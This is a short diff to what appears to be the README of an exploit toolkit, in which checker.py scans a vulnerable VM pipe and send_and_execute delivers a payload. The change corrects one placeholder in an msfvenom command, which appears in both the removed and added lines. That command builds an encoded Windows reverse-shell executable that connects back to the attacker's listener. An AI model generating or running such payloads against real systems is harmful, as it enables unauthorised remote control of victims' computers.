@@ -14,6 +14,6 @@ When checker.py is successful scan the vulnerable VM pipe, run send_and_execute.
 
 If you no have the shell.exe use the msfvenom to spawn one.
 ```
-msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<Your Local IP> LPORT=<Local IP> -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<Your Local IP> LPORT=<Listen Port> -f exe -o shell.exe
 ```
 
